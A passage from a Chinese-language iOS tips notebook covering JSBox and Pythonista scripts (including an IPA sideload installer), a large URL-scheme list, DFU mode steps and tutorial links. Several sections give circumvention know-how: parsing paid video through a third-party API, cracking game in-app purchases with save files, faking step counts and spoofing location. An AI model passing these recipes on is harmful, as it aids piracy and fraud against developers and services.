          make.bottom.inset(10)
        },
        events: {
          didSelect: function(tableView, indexPath, title) {
            if (title == "推荐") {
              $http.get({
                url: "http://www.dybee.cn/",
                handler: function(resp) {
                  var searchM = resp.data
                  if (searchM.search("共找到0篇关于") == -1) {

                    $ui.alert(searchM)//test

                  } else {
                    $ui.alert("test")
                  }
                  //

                }
              })
            }
          }
        }

      }

    ]
  })
}

function addXX6(url) {
  $ui.alert("正在编辑中......")
}

function addport(Port, PortN) {
  $ui.alert("正在编辑中......")

}

/*-------------end@anton.j------------*/
```

#### 脚本库

```
https://github.com/evilbutcher/Code
https://www.lanzous.com/i9ajojg
https://xteko.com/demos
https://github.com/Fndroid/jsbox_script/blob/master/README.md
https://ae85.cn/jb.html
https://pan.baidu.com/s/1XUxvwKic9lnQrvaXtq6pKA#/
https://github.com/Neurogram-R/JSBox
https://github.com/LiuGuoGY/JSBox-addins
```

## Pin

### 视频VIP解析

打开Pin后点击动作列表，添加动作。写好标题选择图标，模式自定义为`解析接口+%@`，其中%@将会被剪切板的内容填充，示例如下。

```
http://api.ledboke.com/vip/?url=%@
```

点击完成，将Pin添加到负一屏Widget，将视频播放链接拷贝后点击刚设置好的动作，即可设置好解析接口并自动跳转到Safari播放。

## Taio

Taio是一款包括剪切板、编辑器和文本工作的应用。

### 动作库

```
https://github.com/evilbutcher/Taio
```

## Pythonista 3

### 安装IPA

将以下内容保存为py文件，并下载到手机上。

```
# Modified from install ipa.py by @mersaor
# https://t.me/axel_burks
 
import os, appex, console, shutil, http.server, webbrowser, time
from os import path
from threading import Thread
 
port_number = 8080
certfile_postion = "./server.pem"
plist_url = "itms-services://?action=download-manifest&url=https://gitee.com/suisr/PlistServer/raw/master/ipa.plist"
save_dir = path.expanduser('./ipa')
if not path.exists(save_dir):
    os.makedirs(save_dir)
     
httpd = None
def startServer(port):
    Handler = http.server.SimpleHTTPRequestHandler
     
    global httpd
    httpd = http.server.HTTPServer(("", port), Handler)
     
    print("Start server at port", port)
    httpd.serve_forever()
 
def start(port):
    thread = Thread(target=startServer, args=[port])
    thread.start()
     
    startTime = int(time.time())
    while not httpd:
        if int(time.time()) > startTime + 60:
            print("Time out")
            break
    return httpd
 
def stop():
    if httpd:
        httpd.shutdown()
 
def main():
    if appex.is_running_extension():
        get_path = appex.get_file_path()
        file_name = path.basename(get_path)
        file_ext = path.splitext(file_name)[-1]
        if file_ext == '.ipa':
            dstpath = path.join(save_dir, 'app.ipa')
            try:
                shutil.copy(get_path, dstpath)
                 
            except Exception as eer:
                print(eer)
                console.hud_alert('导入失败！','error',1)
            start(port_number)
            if httpd:
                webbrowser.open(plist_url)
            try:
                finish = console.alert(file_name, '\n正在安装…请返回桌面查看进度…\n\n安装完成后请返回点击已完成','已完成', hide_cancel_button=False)
                if finish == 1:
                    stop()
                    print("Server stopped")
            except:
                 print("Cancelled")
                 stop()
                 appex.finish()
        else:
            console.hud_alert('非 ipa 文件无法导入安装', 'error', 2)
        appex.finish()
    else:
        console.hud_alert('请在分享扩展中打开本脚本','error',2)
```

下载完成后点击用其他应用打开-Run Pythonista Script-Import File，完成脚本导入。

下载好ipa文件后点击用其他应用打开-Run Pythonista Script-Edit Shortcut，选中刚才导入的IPA Installer脚本，点右上角三角形运行按钮即可安装ipa应用。

### 脚本库

```
https://github.com/evilbutcher/Python
```

## UTM

UTM相当于iOS端的Qemu Manager，可使手机运行Windows或者Linux虚拟机。官网如下。

```
https://getutm.app/
```

未越狱设备可通过AltServer安装，越狱设备可直接安装。安装完成后将系统镜像文件放入手机，然后新建虚拟机。在新建驱动器时需新建两个，一个类型为disk，然后新建文件，输入大小和名称，另一个类型为cd，点击导入文件，选择系统镜像。完成新建后正常启动即可。

如果安装的系统较老，则需在设置中开启`传统PS/2支持`。

## 迅雷

迅雷已经上线App Store，但没有磁力和BT种子下载功能。可以通过以下方法间接下载磁力链接或BT种子。

打开以下网站并登录迅雷账号，点击`上传`，输入要下载的磁力链接或BT种子链接，点击`保存网络文件`。保存后打开迅雷APP，登录刚刚网页版的账号，登录后点击导航栏的`云盘`即可看到保存的文件，点击`取回`即可开始下载。

```
http://pan.xunlei.com
```

## 游戏内购破解

### 反叛公司

下载iMazing游戏存档，链接如下。

```
https://shenlu.lanzous.com/ic7grkh
```

以下操作只能在Windows进行。下载并安装iMazing和iTunes，打开iMazing，连接手机，点击`管理应用程序`，找到要修改的游戏，右键选择`恢复应用程序数据`，选择下载好的存档并确定即可。

### 瘟疫公司

方法同上，链接如下。

```
链接 / https://pan.baidu.com/s/1ou0L4064h0g9ixg_KNJBrg
提取码 / r7qh

// 备用链接
链接 / https://pan.baidu.com/s/1KhJyFGNfS92NB9E5HnNyhQ
提取码 / f9r8
```

## 常见问题

### 跳过双重验证

一般出现在旧版iOS登录App Store。直接把双重认证的验证码填在密码后面即可。

也可打开以下网页，在`安全`一栏点击`App 专用密码`，选择`生成密码⋯`，输入名称后点击`创建`，此时会自动产生一组`xxxx-xxxx-xxxx-xxxx`格式的密码来代替原Apple ID密码。

```
https://appleid.apple.com/
```

### 应用无法联网

尝试在设置中打开其蜂窝网络权限。若无效，可点击设置-通用-还原-还原所有设置。

# 硬件操作

## Home键失灵

越狱后可安装CCSettings插件在控制中心添加主屏幕按钮，或安装Activator插件实现手势操作。

## 电源键失灵

可通过爱思助手完成重启。

# 系统操作

## 添加日历订阅

点击设置-日历-账户-添加账户-其他-添加已订阅的日历，填入服务器地址即可。推荐订阅如下。

```
# 中国节假日补班日历订阅
# Github 仓库为 https://github.com/lanceliao/china-holiday-calender
https://www.shuyz.com/githubfiles/china-holiday-calender/master/holidayCal.ics

# 中国二十四节气日历订阅
# Github 仓库为 https://github.com/KaitoHH/24-jieqi-ics
https://cdn.jsdelivr.net/gh/KaitoHH/24-jieqi-ics@master/23_solar_terms_2015-01-01_2050-12-31.ics

# 电影、美剧、英剧公共日历
https://calendar.google.com/calendar/ical/291ig4cijjnirlc6krcopq5gj4%2540group.calendar.google.com/public/basic.ics
```

也可在以下网站寻找订阅。

```
http://icalshare.com/
https://sspai.com/post/43209
```

## 恢复模式

### 进入

#### 正常方法

彻底关闭设备，并且将设备与PC断开连接。长按Home键的同时将设备连接到计算机，不要松开Home键，直到在设备屏幕上看到`连接到iTunes`的图片。

#### 备选方法

可在按键失灵时使用。用爱思助手即可。

### 退出

按住电源键十秒即可。通过爱思助手进入的需要通过爱思助手退出。

## DFU模式

### 进入

#### 正常方法

把设备连接到PC后关闭设备，同时按住Home键和电源键十秒后松开电源键，继续按住Home键，直到在电脑上看到识别到DFU状态下的USB设备。

#### 按键失灵方法

##### 通过脚本

把设备连接到Windows后下载以下压缩包，解压后双击`DFU.bat`即可。

```
https://feng-bbs-att-1255531212.file.myqcloud.com/2011/10/15/2472983_DFU.rar
```

##### 通过固件

该方法适合早期的iPhone，主要是iOS7及以下的系统。安装较早版本的iTunes（10或11），并下载当前系统的固件。然后下载Redsn0w，链接如下。

```
http://www.iphonehacks.com/download-redsn0w
```

下载完成后以管理员身份运行Redsn0w，选择Extras-Even More-DFU IPSW，选取下载好的固件，等待制作完成。然后连接手机并打开iTunes，连接成功后按住Shift并点击恢复，选择制作好的DFU固件，刷机完成后即进入DFU模式。

### 退出

按住Home键和电源键十秒，设备关机之后重新启动设备即可。

## URL Schemes

URL Scheme通过类似网站形式的字符串，在浏览器打开时自动跳转到对应的APP。如在浏览器中输入`weixin://`则跳转到微信。

### 查询

#### 通过电脑

用解压工具打开要查询的IPA，获得Payload文件夹，打开并在里面的app文件上右键，选择显示包内容。用Xcode等工具打开Info.plist，进入URL types下的URL Schemes即可看到。或者用文本编辑器打开Info.plist，搜索CFBundleURLTypes也可得到。

#### 通过手机

越狱后通过Filza进入IPA查看即可，路径同上。

#### 通过捷径

可通过以下捷径查询。

```
https://www.icloud.com/shortcuts/7803b1b01e6f443187651b6a57fee0f0
```

### 常用URL Schemes

#### 腾讯系

##### QQ

```
// 主页面
mqq://

// 群
mqqapi://card/show_pslcard?src_type=internal&version=1&card_type=group&uin=[QQ群号]

// 联系人
mqqapi://card/show_pslcard?src_type=internal&version=1&uin=[QQ号码]
```

##### QQ HD

```
mqqflyticket://
```

##### 微信

```
// 主页面
weixin://
wechat://

// 扫一扫
weixin://scanqrcode
```

##### 微信读书

```
weread://
```

##### TIM

```
// 主页面
tim://

// 商务聊天
timtribe://
```

##### 滴滴

```
diditaxi://
```

##### 腾讯新闻

```
qqnews://
```

##### 腾讯微云

```
weiyun://
```

##### 腾讯地图

```
sosomap://
```

##### QQ音乐

```
// 主页面
QQmusic://

// 最近播放
qqmusic://today?mid=31&k1=2&k4=0
```

##### QQ浏览器

```
mttbrowser://
```

##### QQ斗地主

```
tencent382://
```

##### QQ安全中心

```
qmtoken://
```

##### QQ国际版

```
mqqiapi://
```

##### QQ邮箱

```
qqmail://
qqquicklogin://
```

##### 腾讯企业邮箱

```
qqbizmailDistribute2://
```

##### 腾讯手机管家

```
mqqsecure://
```

##### 腾讯视频

```
tenvideo://
wb2162695501://
```

##### 腾讯微博

```
TencentWeibo://
```

##### 全民K歌

```
qmkege://
```

##### 王者荣耀

```
tencentlaunch1104466820://
```

##### 王者荣耀助手

```
qw1105200115://
```

##### 企业微信

```
wxwork://
```

##### 腾讯动漫

```
comicreader://
```

#### 阿里系

##### 淘宝

```
taobao://
```

##### 天猫

```
tmall://
```

##### 支付宝

```
// 主页面
alipay://

// 扫一扫
alipayqr://platformapi/startapp?saId=10000007

// 付款
alipay://platformapi/startapp?appId=20000056

// 记账
alipay://platformapi/startapp?appId=20000168

// 滴滴
alipay://platformapi/startapp?appId=20000778

// 蚂蚁森林
alipay://platformapi/startapp?appId=60000002

// 转账
alipayqr://platformapi/startapp?saId=20000116
alipays://platformapi/startapp?appId=20000221

// 手机充值
alipayqr://platformapi/startapp?saId=10000003

// 口令红包
alipayqr://platformapi/startapp?saId=88886666

// 口令红包（带口令）
alipayqr://platformapi/startapp?saId=88886666&passcode=[code]

// 蚂蚁庄园
alipays://platformapi/startapp?appId=66666674

// 蚂蚁宝卡
alipays://platformapi/startapp?appId=60000057

// 股票
alipays://platformapi/startapp?appId=20000134

// 生活缴费
alipays://platformapi/startapp?appId=20000193

// 彩票
alipays://platformapi/startapp?appId=10000011

// 淘票票
alipays://platformapi/startapp?appId=20000131

// 查快递
alipays://platformapi/startapp?appId=20000754

// AA收款
alipays://platformapi/startapp?appId=20000263

// 收款
alipays://platformapi/startapp?appId=20000123

// 还信用卡
alipays://platformapi/startapp?appId=09999999
```

##### 旺旺卖家版

```
wangwangseller://?
```

##### 旺信

```
wangxin://?
```

##### 菜鸟裹裹

```
cainiao://
```

##### 钉钉

```
dingtalk://
```

#### 百度系

##### 百度云

```
baiduyun://
```

##### 百度贴吧

```
com.baidu.tieba://
```

##### 百度音乐

```
baidumusic://
```

##### 百度地图

```
baidumap://
```

##### 百度输入法

```
BaiduIMShop://
```

##### 百度阅读

```
bdbook://
```

##### 手机百度

```
bdboxiosqrcode://
```

##### 百度视频

```
baiduvideoiphone://
bdviphapp://
```

##### 百度糯米

```
bainuo://
```

##### 百度魔图

```
photowonder://
```

##### 百度魔拍

```
wondercamera://
```

##### 百度导航

```
bdNavi://
```

##### 百度浏览器

```
bdbrowser://
```

##### 百度网盘

```
baiduyun://
```

#### 网易系

##### 网易云音乐

```
// 主页面
orpheuswidget://

// 播放已下载的音乐
orpheuswidget://download

// 听歌识曲
orpheuswidget://recognize

// 私人FM
orpheuswidget://radio
```

##### 网易新闻

```
newsapp://
```

##### 网易邮箱

```
neteasemail://
```

##### 网易公开课

```
neteaseVopen://
ntesopen://
```

##### 网易将军令

```
netease-mkey://?
```

##### 有道词典

```
yddict://
yddictproapp://
```

##### 有道翻译官

```
ydtranslator://
```

##### 网易严选

```
yanxuan://
```

##### 网易有钱

```
moneykeeperwiz://
```

##### 网易漫画

```
necomics://
```

##### 有道翻译官

```
ydtranslator://
```

#### 银行

##### 建设银行

```
wx2654d9155d70a468://
```

##### 浦发银行

```
wx1cb534bb13ba3dbd://?
```

##### 招商银行

```
cmbmobilebank://?
```

##### 中国银行

```
BOCMBCIZF://
```

##### 农业银行

```
bankabc://
```

##### 中国工商银行

```
wb19490884://
```

##### 邮政银行

```
wb1424286189://
```

##### 网商银行

```
ap2016041301292400://
```

#### 浏览器

##### iCabMobile

```
iCabMobile://
```

##### UC

```
ucbrowser://
```

##### 猎豹

```
sinaweibosso.422729959://
```

##### Chrome

```
// 主页面
googlechrome://

// 进剪切板链接
googlechrome://%@

// 用google搜索剪切板内容
googlechrome://www.google.com/#newwindow=1&q=%@
```

##### 指尖

```
zhijian://
```

##### Opera

```
oupeng-callback://
```

##### 夸克

```
quark://
```

##### 海豚

```
dolphin://
```

##### Aloha

```
optly7634822906://
```

##### 萝卜

```
wb3791188321://
```

##### 鲨鱼

```
searchss://
```

##### Take

```
TakeBrowser://
```

##### Vip

```
wxbdba67b8ae3d296e://
```

##### Ohajiki

```
oohttp://
```

#### 视频

##### Youtube

```
youtube://
```

##### 哔哩哔哩

```
bilibili://
```

##### 布卡漫画

```
buka://
```

##### 爱奇艺

```
iqiyi://
qiyi-iphone://
```

##### 优酷

```
youku://
```

##### 土豆

```
tudou://
```

##### PPTV

```
pptv://
```

##### PPS

```
ppstream://
```

##### 暴风影音

```
com.baofeng.play://
```

##### 微视

```
weishiiosscheme://?
```

##### ACfun

```
acfun://
```

##### 抖音

```
awemesso://
wb1462309810://
```

##### 西瓜

```
snssdk32://
```

##### 搜狐

```
sohuvideo-iphone://
sohuvideo://
```

##### 快手

```
gifshow://
```

##### nPlayer

```
nplayer://
```

##### AVPlayer

```
AVPlayer://
```

##### yy直播

```
yymobile://
```

##### 一直播

```
xktv://
```

##### 花椒直播

```
huajiao://
```

##### 咪咕

```
miguvideo://
```

#### 社交

##### 微博

```
weibo://
```

##### 微博国际版

```
weibointernational://
```

##### Twitter

```
Twitter://?
tweetie://
```

##### Facebook

```
fb://
```

##### Tumblr

```
tumblr://
```

##### Telegram

```
tg://
```

##### Instagram

```
instagram://
```

#### 音乐

##### 酷狗音乐

```
kugouURL://
```

##### 天天动听

```
ttpod://
```

##### 酷我音乐

```
com.kuwo.kwmusic.kwmusicForKwsing://?
```

##### 虾米音乐

```
// 主页面
xiami://

// 每日推荐歌单
xiami://dailysong?action=play

// 私人电台
xiami://radio/private

// 虾米猜
xiami://radio/guess

// 每日30首
xiami://playdailysong

// 听歌识曲
xiami://soundhound
```

##### 喜马拉雅

```
// 打开专辑
iting://open?msg_type=13&album_id=[专辑ID]
```

#### 图片

##### 抓图猫

```
imagecat://
```

##### Piiic 2

```
wb1934889315://
```

##### Picsew

```
// 主页面
picsew://

// 打开最近长截图
picsew://recent
```

##### NOMO

```
nomocamera://
```

##### Cuto Wallpaper

```
cuto://
```

##### Picsew

```
picsew://
```

#### 系统

##### 照片

```
photos-redirect://
```

##### 短信

```
sms://
```

##### 备忘录

```
save://notes
```

##### App Store

```
// 自动搜索剪贴板内容
itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=%@
```

##### 偏好设置

```
// 无线局域网
App-Prefs:root=WIFI

// 蜂窝移动网络
App-Prefs:root=MOBILE_DATA_SETTINGS_ID
```

##### Workflow

```
// 打开动作
workflow://run-workflow?name=[动作名]
```

##### 电话

```
tel://[电话号码]
```

#### 电商
##### 虎扑

```
tencent222049://
```

##### 闲鱼

```
laiwange48dbf143://
fleamarket://
```

##### 拼多多

```
pinduoduo://
```

##### 美团

```
imeituan://
```

##### 京东

```
// 主页面
openapp.jdmobile://

// 早起打卡
openapp.jdmobile://virtual?params={"des":"jdreactcommon","modulename":"JDReactClockIn","category":"jump";}
```

##### 多点

```
// 会员码
memberNumberDesktop://

// 扫码
scanDesktop://
```

#### 记录

##### 有道云笔记

```
youdaonote://
```

##### 印象笔记

```
evernote://
```

##### 我的标记

```
// 主页面
clover-imark://

// 新建1000*1000空白画布
clover-imark://new/canvas?width=1000&height=1000

// 快速新建画布（网页|底部|手机相册|相机|最新照片）
clover-imark://new/[|web|map|library|camera|latest]
```

#### 搜索

##### 360

```
msearchapp://
```

##### 搜狗

```
sogousearch://
```

#### 共享单车

##### 摩拜

```
mobike://
```

##### ofo

```
ofoapp://
```

#### 学习

##### 扇贝英语

```
shanbay://
```

##### 小猿搜题

```
solar://
```

##### 沪江小D词典

```
hjdict://
```

##### TED

```
ted://
```

##### 一席

```
wx5bc45646a79e74ab://
```

#### 游戏

##### 天天爱消除

```
tencentlaunch100689805://
```

##### 阴阳师

```
com.netease.onmyoji://
```

##### 叨鱼

```
sdguc://
```

##### 崩坏三

```
bh3rd://
```

##### 永远的七日之都

```
neteaseqrzd://
```

##### 芝士超人

```
trivia://
```

#### 阅读

##### 樊登读书会

```
tbopen23329854://
```

##### 多看阅读

```
duokan-reader://
```

##### 当当阅读

```
alipayLogin20150804://
```

##### 开卷有益

```
Kingreader://
```

##### 拿铁阅读

```
LatteRead://
```

#### 外卖

##### 美团外卖

```
meituanwaimai://
```

##### 饿了么

```
eleme://
```

#### 其它

##### 迅雷

```
thunder://?
QQ05FD1622://
```

##### 115云盘

```
wb1307639798://
```

##### 我的标记

```
clover-imark://
```

##### 小米运动

```
fb370547106731052://
```

##### 中国移动

```
wxbcb43ea5d2d6384c://
```

##### 广东移动

```
wb3299513026://
```

##### 探探

```
tantanapp://
```

##### 相册宝

```
albumplus://
```

##### 拍照取字

```
// 主页面
paizhaoquzi://

// 取最新一张图
paizhaoquzi://first
```

##### 圈子账本

```
qzzb://
```

##### JSBox

```
// 主页面
JSBox://

// 运行脚本
jsbox://run?name={编码后的脚本名}
```

##### 京东金融

```
// 双签
jdmobile://share?jumpType=7&jumpUrl=1373
```

##### 冲顶大会

```
tencent1105277177://
```

##### 伙伴办公

```
Open://
```

##### 下厨房

```
xcfapp://
```

##### 有妖气

```
u17app://
```

##### 花生地铁WiFi

```
wxa813eada7109a3cc://
```

##### 少数派

```
sspai://
wx1cabf05524b18692://
```

##### 车到哪儿

```
wx5207ffc5bbac1da7://
```

##### 乐网

```
seven.adclear://
```

##### 收趣

```
shouqu.me://
```

##### 一个番茄

```
com.pomodorowang://
```

##### 京东微联

```
wb1662044625://
```

##### 户外助手

```
wb3060101786://
```

##### 得到

```
dedaoapp://
```

##### 掌上公交

```
wb1955957116://
```

##### Seed

```
seedapp://
```

##### 云墙

```
netfits://
```

##### 潮汐

```
tide://
```

##### Keep

```
keep://
```

##### 今日头条

```
snssdk141://
```

##### Gmail

```
googlegmail://
```

##### 12306

```
cn.12306://
```

##### Browser and File Manager for Documents

```
eidwl://
```

## 修改步数

下载`乐心健康`，登录并在设置中选择数据共享，开启需要修改步数的APP。打开以下网页，登录并修改步数即可。

```
http://step.xbmmw.top/
```

## 修改定位

可通过以下网站查询经纬度。

```
http://www.gpsspg.com/maps.htm
```

### 通过爱思助手

通过爱思助手的虚拟定位功能即可。

### 通过抓包

打开网络调试软件（如Thor）后，打开需要修改定位的App，点击定位相关按钮，查找关于location的数据包，进入经纬度进行修改即可。注意经纬度的小数点精确的位数。

## 查看电池循环次数

打开设置-隐私-分析与改进，保证`共享iPhone分析`处于打开状态，然后点击`分析数据`，下拉并在搜索框搜索`log-aggregated`，找到时间最近的文件，点击右上角并选择`存储到文件`，保存到手机中。

添加以下快捷指令，打开后选择刚才保存的文件即可。

```
https://www.icloud.com/shortcuts/df02957b73414724b94fa58e0a836461
```

## 日历添加法定节假日安排

打开日历APP，点击日历-添加日历-添加订阅日历，链接如下。

```
https://www.hurbai.com/ical.ics
```

## 将iPad作为电脑副屏

有线连接可使用Duet Display、Twomon、Splashtop Wired XDisplay。无线连接可使用Spacesdesk、Duet Air、Moonlight。将平板作为数位板则可考虑EasyCanvas、Astropad Studio。

也可使用Splashtop。在iPad安装Splashtop Personal，打开后点击`我想在封闭网路中使用Splashtop`，按照提示在电脑安装Splashtop Streamer并连接即可。如果希望将iPad作为扩展屏，则可购买HDMI欺骗器并接到电脑上，然后切换投影模式为扩展即可。

## 系统清理

在设置中将系统时间调后一个多月，等待片刻再恢复自动校准时间。

## iOS 13双网变全网通

iPhone 11以下设备（不含），港版、韩版、英版、美版等仅支持移动和联通，不支持电信。可通过开通电信VoLTE的方式添加支持。


# 常见问题

## 切换AppStore账号后自动下载App

进入AppStore中的账号详情，点击`删除此设备`即可。

# 参考教程

## 不按任何键即可进入DFU模式

```
https://www.feng.com/post/3028191
```

## 通过软件恢复进入DFU刷机模式教程

```
http://iphone.tgbus.com/tutorial/hacktutorial/201207/20120706173454.shtml
```

## 修改步数，免越狱，免root，wx&zfb&qq一键刷步数！！！

```
https://mp.weixin.qq.com/s/S6DhF6P8f68ejPz9xoP5bw
```

## AltServer安装UTM iOS虚拟机运行Windows

```
https://www.bilibili.com/video/BV137411M7sd
https://www.bilibili.com/video/BV1Vj411f7Nu
```

## 捷径制作教学

```
https://mp.weixin.qq.com/s/iGzhb1G3YY3p5UEgxeoVJg
https://mp.weixin.qq.com/s/OMTyQ_LAR6zaRQbz_sog5g
```

## 使用Xcode签名IPA教程

```
https://mp.weixin.qq.com/s/edwIuv8DyXklLT00RsdavA
```

## 如何在不同基板(框架)/APT(规范)下施展Cydia和Sileo的轮回骚操作

```
https://mp.weixin.qq.com/s/9oMQVCdudK_jYvTVw5zQTw
```

## Cydia for iOS7-iOS13 内各种红字、黄字常见错误解决方法全收录

```
https://mrmad.com.tw/cydia-red-yellow-error
```

## IOS逆向-APP砸壳

```
https://mp.weixin.qq.com/s/jZHAr_i0IL72EpBYQCibMQ
```

## windows上ios App一键砸壳教程(不需要ssh)

```
https://bbs.pediy.com/thread-252384.htm
```

## 王者荣耀修改教程

```
https://mp.weixin.qq.com/s/kawj3yg4lklM7BGrM4lXew
https://mp.weixin.qq.com/s/5g0pjMRXkZc0g1hvs9oqoQ
https://mp.weixin.qq.com/s/kAwToNnMArbyG9hk-nzalg
https://mp.weixin.qq.com/s/trKrmzkOg8qUx9LVGu3WCg
https://mp.weixin.qq.com/s/21gSod8io0L4ygYIK2C0vg
https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzA5OTU0MTE1MQ==&scene=1&album_id=1318325233564172288#wechat_redirect
```

## iOS逆向工程初体验

```
https://medium.com/zrealm-ios-dev/ios-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%9D%E9%AB%94%E9%A9%97-7498e1ff93ce
```

## LEECO - 捷径作品

```
https://shimo.im/docs/DHcYv8xjcYxvHvQg/read
```

## coolstar/Odyssey-bootstrap

```
https://github.com/coolstar/Odyssey-bootstrap
```

## AppStore降价监控

```
https://www.antmoe.com/posts/77e27eac/index.html
```


## URL Scheme分享

```
https://st3376519.huoban.com/share/1985010/VGi2N5Vf0C1MVnHCVWiBc8L9g15c9VGJbMGcFrb6/172707/list
```

## Workflow规则 | 小新制作

```
https://www.limufang.com/post/526.html
```


## 如何在苹果商店把App降级至任意版本

```
https://mp.weixin.qq.com/s/afXnjvgwA0aC3NaPg53l_g
```


## 介绍 - BoxJs

```
https://chavyleung.gitbook.io/boxjs/
```


## Sub-Store 教程

```
https://www.notion.so/Sub-Store-6259586994d34c11a4ced5c406264b46
```

## learn-regex/README-cn.md

```
https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md
```

## QuantumultX/QuantumultX_Profiles.conf

```
https://github.com/KOP-XIAO/QuantumultX/blob/master/QuantumultX_Profiles.conf
```

## Quantumult-X/sample.conf

```
https://github.com/crossutility/Quantumult-X/blob/master/sample.conf
```


## futurerestore ，iOS 系统刷机到指定版本

```
https://mp.weixin.qq.com/s/L3vNBWcWWDUEPuziO0KdWA
```


## 无法 OTA 更新系统，解决办法来了

```
https://mp.weixin.qq.com/s/KzZ5ZX1xw_JBdgyCpTM5eg
```

## 「Scriptbale小组件」：推特下载器 (已开源)

```
https://mp.weixin.qq.com/s/GIpuPwN5X4ZiTQZdNhESgw
```

## 「Scriptbale小组件」：ins万能下载器 (已开源)

```
https://mp.weixin.qq.com/s/XL9qM6i3firedY_N3AMfRg
```

## 小技巧 | 查看 iPhone 电池循环次数

```
https://mp.weixin.qq.com/s/hBIanqg5-9jiHWppGCL1yg
```

## 神级应用！爱了！冲！

```
https://mp.weixin.qq.com/s/VjkXjLBKPCo1v5p0INDhsg
```

## 网页版小组件商店教程

```
https://www.notion.so/396b02ceeab04bb6b6e16492afbc4d3f?v=97d0676933f6462884643daa02320a2f
```

## 快捷指令 ｜运动刷榜，支持微信，支付宝等！

```
https://mp.weixin.qq.com/s/6E5monX6gp0bMc0J4U_mCQ
```

## 没用上这款系统内置神器APP，绝对是你的无谓损失！

```
https://mp.weixin.qq.com/s/dZWGfbTVG-78Qpe4yarKTA
```

## 让 iPhone 自带日历 App 显示国家法定节假日安排

```
https://mp.weixin.qq.com/s/ToZjqtRTgxPxswF02-H_oA
```

## 别怪我白嫖哈，这可是你自己上架的功能全解锁版

```
https://mp.weixin.qq.com/s/zkolfG0Tvj8ImgKrJB80Vg
```

## Sideloadly，无需越狱，自签安装 IPA 文件，免费

```
https://mp.weixin.qq.com/s/gM4nv-WLyysWmM3BtLFr5w
```

## 你所珍藏的历史旧版本 app

```
https://www.v2ex.com/t/452086?p=2
```

## 【IOS】常用旧版软件ID整理分享

```
https://www.jianshu.com/p/5a28dacba975
```

## [其他] 【IOS】好用的旧版APP —6.3更新—

```
https://www.52pojie.cn/thread-741535-1-4.html
```

## iOS 14.6 - 14.8 系统越狱来了，你需要知道这些

```
https://mp.weixin.qq.com/s/zf3cJqinVIE4G8w7lJQLXQ
```

## unc0ver 更新 7.0.1 版本，真的是完美越狱吗？

```
https://mp.weixin.qq.com/s/dGvP2l4JwwkAMj-kevzoNw
```

## FilzaEscaped15 来了，iOS 系统文件管理器，无需越狱

```
https://mp.weixin.qq.com/s/cDmx4doiumVOBZuuE9jUjg
```

## 手机平板秒变电脑副屏，折腾一周后最流畅、最方便的方法

```
https://mp.weixin.qq.com/s/ZvLQQt1-FyToTtZA14Vifg
```

## 最出名的那些日历APP，结果一点都不够好用...

```
https://mp.weixin.qq.com/s/LSW7nB-5dLhEgSTqlOvy8g
```

## iOS 永久签名，永不过期，无需越狱，完全免费，速度

```
https://mp.weixin.qq.com/s/fjD7CDQFZ_BGvCsz8qdyog
```

## iOS 永久签名，支持 iOS 14.0 - 15.4.1，支持全系设备，官方在线安装，永不过期，完全免费

```
https://mp.weixin.qq.com/s/0f2My5VsQMSOoHXhwPo0aA
```

## iOS 系统，主题美化，真主题，抢鲜使用，无需越狱，免费

```
https://mp.weixin.qq.com/s/eDl_Og4I-nFotAgNwp2AnA
```

## 轻松签+，无需证书，永久签名，永不过期，无需越狱

```
https://mp.weixin.qq.com/s/STdwUdba7Pc8klnfzfcmlw
```

## futurerestore 指南 ，iOS 系统刷机到指定版本

```
https://mp.weixin.qq.com/s/_faR7J2tvxUunr1ZijdIig
```

## CrackerXI+，砸壳，提取 IPA

```
https://mp.weixin.qq.com/s/SIf8tWc1IH1ZZLHOiYG3Fw
```

## [Tutorial] Save TONS of GB's on smaller storage iDevices!

```
https://www.reddit.com/r/jailbreak/comments/pmcj2s/tutorial_save_tons_of_gbs_on_smaller_storage/
```

## Since we don’t have iCleaner Pro for TrollStore, it’s possible to delete some large cache files from Filza without harm to the system.

```
https://www.reddit.com/r/Trollstore/comments/yhw4kb/since_we_dont_have_icleaner_pro_for_trollstore/
```

## iOS 系统，一键更换字体，大神接手，新版下载地址，必看

```
https://mp.weixin.qq.com/s/Rf8WAaKGz26pAWYSkCo6Bg
```

## 切换id后会自动下载app

```
https://discussionschinese.apple.com/thread/253193718
```

## 关于 MacDirtyCow，支持的系统范围，必看

```
https://mp.weixin.qq.com/s/h9R_veKuOd2ienAHce9KYw
```

## iOS 系统，自定义4G/5G，无需越狱，非常简单

```
https://mp.weixin.qq.com/s/2bbId2CsBfQMt8OxdBlHkw
```

## 黑科技，老款 iPhone 激活灵动岛，无需越狱，支持这些系统

```
https://mp.weixin.qq.com/s/_yDmSWBKnv7wGjtm_F7UqA
```

## iOS 系统，自定义小元素，个性十足

```
https://mp.weixin.qq.com/s/dG4TWMeWlEfMmXyEKvYt2Q
```

## iOS 系统，自定义锁屏手电筒和相机，简单

```
https://mp.weixin.qq.com/s/ux2yU0tRg2w5_fQIAJ_FvQ
```

## FileSwitcherPro，多功能修改器（一）

```
https://mp.weixin.qq.com/s/pfHhe7kyiUAkt7TUKmLJ7g
```

## FileSwitcherPro，多功能修改器（二）如何替换文件

```
https://mp.weixin.qq.com/s/p7J3YK9eHFYq7LxvSqZ-VQ
```

## iOS 系统，电池、亮度、音量百分比，清除角标，快速控制中心，完全免费

```
https://mp.weixin.qq.com/s/tXfKj3_HgZB4frYFQ4dPww
```

## iOS 系统，截图神器，详细使用

```
https://mp.weixin.qq.com/s/F8_flUzRjaQhyUg6fT9tNQ
```

## iOS 系统，真正的 iPhone 通话录音，就这么简单

```
https://mp.weixin.qq.com/s/WUWIdWcWB1lwKMfvUr4CtQ
```

## iOS 系统，老设备立刻拥有灵动岛，来了

```
https://mp.weixin.qq.com/s/I1kZRanmJ-AJ0XAvlytSTg
```

## iOS 系统，弹窗自适应，独立设置，录像暂停，Dock 动图，完全免费

```
https://mp.weixin.qq.com/s/6JJ4kDy4r459QK3HLXyG2Q
```

## iOS 系统，桌面 App 快速移动到指定文件夹

```
https://mp.weixin.qq.com/s/5ImIQevXIN071Jc9nG-A0w
```

## iOS 系统，iPhone 水特效，清凉

```
https://mp.weixin.qq.com/s/_ctkLwa00Vuh-IPbppx7DA
```

## 近期插件更新，看看

```
https://mp.weixin.qq.com/s/k81Vg0MjJJKnvfdQ9h9JUw
```

